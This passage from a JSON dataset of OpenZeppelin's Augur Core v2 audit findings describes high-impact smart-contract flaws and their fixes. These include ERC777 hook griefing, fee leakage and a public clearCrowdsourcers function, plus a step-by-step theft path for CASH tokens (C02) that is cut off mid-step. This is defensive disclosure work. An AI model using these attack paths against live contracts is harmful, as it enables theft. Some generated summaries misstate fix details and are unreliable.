      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11505",
      "title": "[C07] All dispute bonds can be held hostage or permanently frozen when a Market is in a forking universe",
      "impact": "HIGH",
      "content": "When a non-forking market is in a forking universe, its [`disavowCrowdsourcers`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L400) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L400) must be called either directly or through the [`migrateThroughOneFork`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L357) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L357) before dispute bond holders can [redeem](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L35) and migrate their REP tokens to a child universe. This is due to the fact that the `DisputeCrowdsourcer` contract [must be disavowed or the market must be finalized](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L36-L39) before redemption is allowed, and the market [cannot be finalized in a forking universe](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L242).\n\n\nIn the `disavowCrowdsourcers` function, a [transfer](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L415) of REP tokens is made to the `repBondOwner` address. As the REP token is similar to an [ERC777 token](https://eips.ethereum.org/EIPS/eip-777), its [`transfer`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L96) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/ReputationToken.sol#L96) will call the [`tokensReceived`](https://eips.ethereum.org/EIPS/eip-777#erc777tokensrecipient-and-the-tokensreceived-hook) [hook](https://eips.ethereum.org/EIPS/eip-777#erc777tokensrecipient-and-the-tokensreceived-hook) on the `repBondOwner` address if it is an [ERC820-registered](https://eips.ethereum.org/EIPS/eip-820) contract.\n\n\nA malicious `repBondOwner` account could leverage this hook to revert any calls to the `tokensReceived` function, rendering it impossible to successfully call the `disavowCrowdsourcers` or `migrateThroughOneFork` functions on that market. As a consequence, this attack will effectively freeze all dispute bond funds and therefore prevent the market from being migrated to the winning fork. It would be trivial for the malicious `repBondOwner` account to only release funds when a ransom has been paid to the contract which can then be collected by the attacker. This can also be exploited just as a griefing attack to cause Augur reporting participants to lose funds.\n\n\nWhen making ERC777-like transfers, consider strictly implementing the [withdrawal payments pattern](https://solidity.readthedocs.io/en/v0.5.4/common-patterns.html#withdrawal-from-contracts) (a.k.a. “pull style” payments) or ensuring the ERC777 transfer hooks are not called to mitigate attack vectors associated with making calls to external addresses.\n\n\n***Update****: fixed in* [*`c6eed38.`*](https://github.com/AugurProject/augur/commit/c6eed38e36d2ca6f11d26175df05d9284e830936) *The transfer of REP token in the* *`disavowCrowdsourcers`* *function no longer calls the ERC 777 hooks.*",
      "summary": "\nThis bug report is about a vulnerability in Augur's market when it is in a forking universe. The vulnerability is that a malicious repBondOwner account could leverage the ERC777 token transfer hook to prevent users from successfully calling the disavowCrowdsourcers or migrateThroughOneFork functions on that market. This would freeze all dispute bond funds and prevent the market from being migrated to the winning fork. It could also be exploited as a griefing attack to cause Augur reporting participants to lose funds.\n\nTo fix this vulnerability, the transfer of REP token in the disavowCrowdsourcers function was changed to no longer call the ERC 777 hooks. This was done by strictly implementing the withdrawal payments pattern (a.k.a. “pull style” payments) or ensuring the ERC777 transfer hooks are not called. This fix was released in the c6eed38 commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11504",
      "title": "[C06] Affiliate’s fees can be withdrawn in an invalid, finalized Market",
      "impact": "HIGH",
      "content": "The `Market` contract implements the [`recordMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L295) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L295), which can only be called by [“known fee senders”](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L296) and is in charge of calculating the amount of fees to be assigned to the creator and the affiliate (if exists). When the market [is finalized](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L303-L304), the function takes care of calling the [`distributeMarketCreatorFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L314) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L314). This last function either:\n\n\n* A) If the market is valid, [transfers the current owner all corresponding fees](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L316) (*i.e.* `marketCreatorFeesAttoCash`). Additionally, if there is an affiliate, `distributeMarketCreatorFees` [sends the corresponding fees to the affiliate too by calling the](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L318) [`withdrawAffiliateFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L318) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L318).\n* B) If the market is invalid, [sends all market creator fees](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L321) (*i.e.* `marketCreatorFeesAttoCash`) to a fee pool.\n\n\nIn case (B), the amount of CASH tokens sent to the fee pool does not include any affiliate fees (they are always [subtracted from](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L300) [`marketCreatorFeesAttoCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L300) [in line 300](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L300)). That means that the [transfer of CASH tokens in line 321](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L321) does not actually transfer the affiliate’s fees to the pool, and therefore an affiliate can still call [`withdrawAffiliateFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L327) to cash out the fees.\n\n\nIn a scenario where addresses controlled by the market creator are set as the affiliate address in trading operations, and the `affiliateFeeDivisor` is set to 1 (so that in [line 298](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L298) the `_affiliateFees` are as high as possible – equal to `marketCreatorFees`), then the market creator will not lose any fees if the market ends up being invalid, as they will be able to get away with all affiliate fees by calling the [`withdrawAffiliateFees`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L327) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L327).\n\n\nSimilar to what is currently done with market creator fees, consider implementing the necessary changes in the `distributeMarketCreatorFees` function to effectively send all affiliate fees to the fee pool if the market is invalid. Unit tests to cover this sensitive scenario are in order, which should prevent this issue from being reintroduced in future changes to the code base.\n\n\n***Update****: fixed in* [*`8707454`*](https://github.com/AugurProject/augur/commit/87074545a99c6dd97709286fbdeca01e0454b7bf) *. Affiliate fees are now transferred to the dispute window for invalid markets.*",
      "summary": "\nThis bug report is about an issue with the `Market` contract in the Augur Project. This contract implements the `recordMarketCreatorFees` function, which can only be called by \"known fee senders\" and is in charge of calculating fees to be assigned to the creator and the affiliate (if exists). When the market is finalized, the function calls the `distributeMarketCreatorFees` function. In the case of a valid market, this function transfers the current owner all corresponding fees and, if there is an affiliate, sends the corresponding fees to the affiliate too. However, in the case of an invalid market, the function only sent the market creator fees to a fee pool, but not the affiliate fees, meaning the affiliate could still call the `withdrawAffiliateFees` function to cash out the fees.\n\nTo fix this issue, changes were made to the `distributeMarketCreatorFees` function to ensure all affiliate fees are sent to the fee pool if the market is invalid. Additionally, unit tests were created to cover this sensitive scenario to prevent the issue from being reintroduced in future changes to the code base. The bug has now been fixed in the `8707454` commit, where affiliate fees are now transferred to the dispute window for invalid markets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11503",
      "title": "[C05] Unfillable orders can be placed to constrain or halt markets",
      "impact": "HIGH",
      "content": "In the [`FillOrder`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L363) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L363), the `fillOrder` function calls `tradeMakerTokensForFillerTokens` in the [`Trade`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L18) [`library`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L18) located in the same file. The `tradeMakerTokensForFillerTokens` function makes a [transfer](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L197-L199) of `longShareToken` and `shortShareToken` to the `_longBuyer` and `_shortBuyer` respectively. Either the `_longBuyer` or the `_shortBuyer` will be the order `creator` depending on the direction of the trade. Both transfers will trigger the [`tokensReceived`](https://eips.ethereum.org/EIPS/eip-777#erc777tokensrecipient-and-the-tokensreceived-hook) [hook](https://eips.ethereum.org/EIPS/eip-777#erc777tokensrecipient-and-the-tokensreceived-hook) on the recipient if the recipient is an [ERC820-registered](https://eips.ethereum.org/EIPS/eip-820) contract. This means that if the order `creator` is a contract that reverts when `tokensReceived` is called, the order will be unfillable because it will cause `fillOrder` to revert.\n\n\nAccording to Augur v2 whitepaper, “Orders are never executed at a worse price than the limit price set by the trader, but may be executed at a better price.” An unfillable order may severely limit or completely disable a market because it must be filled before an order with a worse price can be filled. This applies to orders on both sides of the order book.\n\n\nAny malicious user can exploit this vulnerability by placing an unfillable order at a price they do not want the market to trade above or below (depending on the direction of the order), thus creating an artificial ceiling or floor on the market. Furthermore, just by placing two unfillable orders, one long, one short, with a very tight spread, the attacker can effectively halt all trading operations in any Augur market.\n\n\nConsider using the [`trustedFillOrderTransfer`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/ShareToken.sol#L59) function instead of `transfer`, both in [line 197](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L197) and [line 199](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/trading/FillOrder.sol#L199) of `FillOrder.sol`, to ensure the [`ERC777`](https://eips.ethereum.org/EIPS/eip-777) [`hooks`](https://eips.ethereum.org/EIPS/eip-777) are not called, which should mitigate the described critical vulnerability.\n\n\n***Update:*** *fixed in* [*`98a3f36`*](https://github.com/AugurProject/augur/commit/98a3f369bbf00f8ee9fd392fbe1612fd3c5d66be) *by modifying transfers of Augur’s Share tokens to no longer call the ERC 777 hooks.*",
      "summary": "\nThis bug report is about a vulnerability in the Augur v2 'FillOrder' contract. The 'fillOrder' function calls the 'tradeMakerTokensForFillerTokens' function in the 'Trade' library located in the same file. The 'tradeMakerTokensForFillerTokens' function makes a transfer of 'longShareToken' and 'shortShareToken' to the '_longBuyer' and '_shortBuyer' respectively. This transfer triggers the 'tokensReceived' hook on the recipient if the recipient is an ERC820-registered contract. If the order creator is a contract that reverts when 'tokensReceived' is called, the order will be unfillable, which can severely limit or completely disable a market. Malicious users can exploit this vulnerability by placing an unfillable order at a price they do not want the market to trade above or below, thus creating an artificial ceiling or floor on the market. \n\nTo mitigate this critical vulnerability, Augur suggested using the 'trustedFillOrderTransfer' function instead of 'transfer' in lines 197 and 199 of 'FillOrder.sol'. This should ensure that the ERC777 hooks are not called. The bug has since been fixed in '98a3f36' by modifying transfers of Augur's Share tokens to no longer call the ERC 777 hooks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11502",
      "title": "[C04] DisputeCrowdsourcer contract does not allow for the purchase of overload tokens once its size is filled",
      "impact": "HIGH",
      "content": "The `DisputeCrowdsourcer`‘s [`contribute`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L75) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L75) is expected to mint [DISP tokens](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L18) for contributors until the funding goal is reached. After the funding goal has been reached, further contributions are rewarded with “overload tokens” to enable participants to quickly raise the dispute stakes without waiting through multiple dispute rounds. This mechanism prevents malicious parties from dragging out disputes.\n\n\nHowever, in [line 78](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L78) of `DisputeCrowdsourcer.sol`, `size.sub(_curStake)` will inevitably revert if `_curStake` is larger than `size`. `size` is the funding goal of the `DisputeCrowdsourcer` and is the threshold at which DISP tokens stop being minted, replaced by the minting of overload tokens. The value of `_curStake` is calculated by the [`getStake`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L106) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol#L106) which sums the total supply of all DISP and overload tokens. As a consequence, only the first purchase of overload tokens that brings the total stake above the funding goal will succeed. Every subsequent attempt to contribute to the tentative outcome (*i.e.* by purchasing overload tokens) will revert because the total number of overload tokens and DISP tokens will exceed the funding goal (*i.e.* `size`).\n\n\nConsider refactoring the `contribute` function to handle the described scenario, where the total number of overload tokens and DISP tokens exceeds the funding goal, so as to ensure disputes cannot be easily dragged out by malicious parties.\n\n\n*Note: The* *`DisputeCrowdsourcer`* *contract is not within the scope of this audit but has many interactions with the contracts covered by this report.*\n\n\n***Update:*** *fixed in* [*`2ea5753`*](https://github.com/AugurProject/augur/commit/2ea575351ff90253cca7380ccf141fec2e101b0b) *by removing the concept of overload tokens.*",
      "summary": "\nThis bug report is regarding the `DisputeCrowdsourcer` contract, which is used to mint tokens for contributors until the funding goal is reached. After the funding goal is reached, further contributions are rewarded with “overload tokens” to prevent malicious parties from dragging out disputes. However, in line 78 of `DisputeCrowdsourcer.sol`, `size.sub(_curStake)` will inevitably revert if `_curStake` is larger than `size`. `size` is the funding goal of the `DisputeCrowdsourcer` and is the threshold at which DISP tokens stop being minted, replaced by the minting of overload tokens. The value of `_curStake` is calculated by the `getStake` function which sums the total supply of all DISP and overload tokens. As a consequence, only the first purchase of overload tokens that brings the total stake above the funding goal will succeed, and every subsequent attempt to contribute will revert.\n\nThis bug was fixed in `2ea5753` by removing the concept of overload tokens. The refactored `contribute` function handles the scenario where the total number of overload tokens and DISP tokens exceeds the funding goal, thus ensuring disputes cannot be easily dragged out by malicious parties.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11501",
      "title": "[C03] Anyone can remove all market’s dispute crowdsourcers",
      "impact": "HIGH",
      "content": "After an initial report is done, the tentative outcome for an Augur market can be disputed by any REP token holder during the market’s dispute round. Such dispute consists of staking REP tokens on an outcome other than the market’s current tentative outcome. A dispute is considered successful when the total amount of dispute stake on some outcome meets the dispute bond size required for the current dispute round. It is important to highlight that dispute bonds do not need to be paid in their entirety by a single user; instead, users can crowdsource them.\n\n\nDuring the dispute round, a `Market` keeps track of contributions to each possible outcome by instantiating [`DisputeCrowdsourcer`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/DisputeCrowdsourcer.sol) contracts, storing references to them in the [`crowdsourcers`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L59) [`collection`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L59). These `DisputeCrowdsourcer` contracts act as escrows for the staked REP tokens for each possible outcome, and are expected only to be cleared (via the [`clearCrowdsourcers`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L425) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L425)) when either the [crowdsourcing for a particular dispute bond finishes](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L201) or [existing crowdsourcers need to be disavowed during a fork](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L420). However, as the [`clearCrowdsourcers`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L425) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L425) is `public`, anyone can, at any time, silently delete all crowdsourcer addresses registered in a `Market` contract. This renders the entire disputing process pointless, as anyone can just delete all crowdsourcers before a dispute bond is about to be filled, thus avoiding any dispute over the market’s tentative outcome.\n\n\nConsider restricting the visibility of the [`clearCrowdsourcers`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L425) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L425) to `private`. Furthermore, to prevent this issue from being reintroduced in future changes to the code base, consider adding related unit tests.\n\n\n***Update****: fixed in* [*`99d06e8`*](https://github.com/AugurProject/augur/commit/99d06e861ae8cd79fa92ee2c101bfac4ead2a4ef) *by restricting the* *`clearCrowdsourcers`* *function’s visibility to* *`private`**.*",
      "summary": "\nAugur is a decentralized prediction market platform that allows users to stake their REP tokens on an outcome of a market. During the dispute round, a `Market` contract keeps track of contributions to each possible outcome by instantiating `DisputeCrowdsourcer` contracts, which act as escrows for the staked REP tokens. It was discovered that the `clearCrowdsourcers` function, which is responsible for clearing the `DisputeCrowdsourcer` contracts, was public, meaning anyone could delete all the crowdsourcers before a dispute bond is filled, thus avoiding any dispute over the market’s tentative outcome. To fix this, the visibility of the `clearCrowdsourcers` function has been restricted to `private` and related unit tests have been added to prevent this issue from being reintroduced in future changes to the code base.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Augur Core v2 Audit",
      "source_link": "https://blog.openzeppelin.com/augur-core-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11500",
      "title": "[C02] CASH tokens can be stolen from the Market contract",
      "impact": "HIGH",
      "content": "By exploiting the critical vulnerability described in **“[C01] All CASH tokens approved to Augur can be emptied”**, any malicious user can move all CASH tokens approved to Augur, sending them to Market contracts. But the attacker does not *directly* benefit from the attack.\n\n\nHowever, a severe attack vector has been identified in the Market contract that would allow the attacker to actually steal all tokens previously moved to the Market contract. Therefore, this issue should be considered as an extension of **“[C01] All CASH tokens approved to Augur can be emptied”**. Following, we set out to describe step by step how an attacker can leverage a malicious universe and the lack of input validations to finally move the CASH tokens to any address in their control.\n\n\nOnce the approved CASH tokens are moved to the `Market` contract (described in **“[C01] All CASH tokens approved to Augur can be emptied”**), the [`MarketFactory`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol) [contract](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/factories/MarketFactory.sol) calls the market’s [`initialize`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L63) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L63). This means that:\n\n\n* 1.1) Market’s [`owner`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L78) and [`repBondOwner`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L79) are set to the victim’s address (*i.e.* the `_sender` parameter).\n* 1.2) Market’s [`universe`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L75) is set to an attacker controlled `IUniverse` contract.\n* 1.3) The market [adds a new](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [`InitialReporter`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [to the](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [p`articipants`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87) [`array`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L87), the attacker being the [`designatedReporter`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L22) of the added `InitialReporter` contract.\n* 1.4) Market’s [`repBond`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L98) [is set to](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L98) [`0`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L98), as `universe.getOrCacheMarketRepBond()` is controlled by the attacker.\n* 1.5) Market’s [`validityBondAttoCash`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L100) [is set](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L100) to the entire CASH balance of the `Market` contract.\n\n\nNow, when the market’s `endTime` passes (this parameter is attacker-controlled too, and [set during initialization](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L81)), the attacker can either submit an initial report or just wait the 24 hours until public reporting is allowed. In any case, the `Market` has to be reported as “Invalid”.\n\n\n* 2.1) Regardless of when the attacker submits the initial report, the transfer operations in [lines 151 and 152](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L151-L152) or [line 154](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L154) of `Market.sol` will move `0` REP tokens, as `_initialReportStake` is the same as `repBond` and `repBond` was set to zero (see 1.4).\n* 2.2) In [line 140](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L140) the `disputeWindow` of the `Market` is initialized by the attacker-controlled `universe`.\n* 2.3) In [line 141](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L141) (then [lines 46 and 47 of](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L46-L47) [`InitialReporter.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L46-L47)) the attacker gets registered as the `owner` and `actualReporter` of the `InitialReporter` contract.\n* 2.4) Then, in [line 50 of](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L50) [`InitialReporter.sol`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L50) the `payoutNumerators` is set to the attacker-controlled `_payoutNumerators`, such that `payouNumerators[0] > 0`, so the `Market` is reported as “Invalid”. From now on, the function [`getPayoutNumerator(0)`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/BaseReportingParticipant.sol#L54) (inherited from the `BaseReportingParticipant` contract) will always return a value greater than zero.\n* 2.5) In [line 51](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/InitialReporter.sol#L51) of `InitialReporter.sol` the `size` is set to zero.\n\n\nFinally, the attacker calls the [`finalize`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L235) [function](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L235) on the `Market` contract.\n\n\n* 3.1) The `require` statement in [line 236](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L236) of `Market.sol` is verified correctly.\n* 3.2) In [line 237](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L237), the attacker-controlled `universe` returns the necessary value to make `true` the conditional clause, bypassing (*i.e.* never executing) all logic in the [`else`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L240) [`clause`](https://github.com/AugurProject/augur/blob/9a33c3269e812d0cb66d49b61a72db58e32e4749/packages/augur-core/source/contracts/reporting/Market.sol#L240).\n* 3.3) The attacker-controlled `universe` sets `winningPayoutDistributionHash` to some value other than zero in [line 